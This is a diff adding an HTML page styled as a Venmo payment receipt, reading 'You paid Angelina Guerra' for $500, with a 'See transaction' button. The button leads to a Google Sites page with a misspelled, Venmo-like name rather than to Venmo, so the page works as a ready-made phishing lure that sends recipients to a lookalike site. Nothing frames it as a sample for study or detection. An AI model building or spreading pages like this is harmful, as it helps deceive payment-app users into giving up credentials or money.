@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Venmo Receipt</title>
+<style>
+    body {
+        margin: 0;
+        padding: 0;
+        background: #1d1f23;
+        font-family: Arial, sans-serif;
+        color: white;
+        display: flex;
+        justify-content: center;
+        padding-top: 20px;
+    }
+
+    .container {
+        width: 360px;
+        background: #1d1f23;
+        text-align: center;
+    }
+
+    .logo {
+        width: 160px;
+        margin: 0 auto 10px auto;
+        display: block;
+    }
+
+    .card {
+        background: #27292d;
+        border-radius: 18px;
+        border: 1px solid #3c3e42;
+        padding: 40px 20px;
+        box-shadow: 0px 12px 20px rgba(0,0,0,0.35);
+    }
+
+    .profile {
+        width: 80px;
+        height: 80px;
+        border-radius: 50%;
+        margin-bottom: 20px;
+        opacity: 0.9;
+    }
+
+    .title {
+        font-size: 20px;
+        margin-bottom: 10px;
+    }
+
+    .amount {
+        font-size: 45px;
+        font-weight: bold;
+        margin-bottom: 5px;
+    }
+
+    .deposit-label {
+        text-align: left;
+        width: 100%;
+        font-size: 20px;
+        opacity: 0.85;
+        margin-top: 25px;
+        margin-bottom: 15px;
+    }
+
+    .button {
+        display: block;
+        width: 100%;
+        background: #4c8df6;
+        padding: 18px 0;
+        border-radius: 40px;
+        text-align: center;
+        font-size: 20px;
+        font-weight: bold;
+        text-decoration: none;
+        color: black;
+    }
+</style>
+</head>
+<body>
+
+<div class="container">
+    <img class="logo" src="https://i.imgur.com/8TYZ7ea_d.webp?maxwidth=760&fidelity=grand">
+
+    <div class="card">
+        <img class="profile" src="https://ci3.googleusercontent.com/meips/ADKq_NYbbCLn-DztT57CfA6hepCJmLdcdlaBtA73wWdLWRUWiOsQn2MgiLclq4If6rwRURSUAtlSizp17BZeHwL7F-bt=s0-d-e1-ft">
+
+        <div class="title">You paid Angelina Guerra</div>
+
+        <div class="amount">$500<sup style="font-size:18px; vertical-align:super;">00</sup></div>
+
+        <div class="deposit-label">Deposit</div>
+
+        <a class="button" href="https://sites.google.com/view/dvemolonlineacconthomepage/home?read_current=1">See transaction</a>
+    </div>
+</div>
+
+</body>
+</html>
